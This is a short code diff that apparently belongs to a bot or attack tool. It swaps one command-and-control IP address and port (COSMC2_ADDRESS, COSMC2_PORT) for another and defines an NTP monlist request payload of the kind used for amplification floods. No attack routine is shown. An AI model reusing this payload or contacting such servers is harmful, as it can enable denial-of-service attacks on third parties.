@@ -10,8 +10,8 @@ from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
-COSMC2_ADDRESS  = "87.106.190.187"
-COSMC2_PORT  = 10097
+COSMC2_ADDRESS  = "37.148.199.199"
+COSMC2_PORT  = 10448
 
 
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
